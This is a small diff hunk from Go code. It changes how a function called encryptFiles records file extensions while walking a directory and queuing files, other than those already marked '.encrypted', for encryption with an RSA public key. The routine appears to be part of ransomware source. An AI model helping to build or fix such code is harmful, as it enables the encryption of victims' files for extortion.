@@ -88,7 +88,7 @@ func encryptFiles(dirPath string, cPubKey *rsa.PublicKey) {
 				}
 				ext = filepath.Ext(path)
 				if ext != ".encrypted" {
-					filesToVisit <- io.File{Info: info, Path: path, Extension: ext}
+					filesToVisit <- io.File{Info: info, Path: path, Extension: ext[1:]}
 				}
 			}
 			return nil
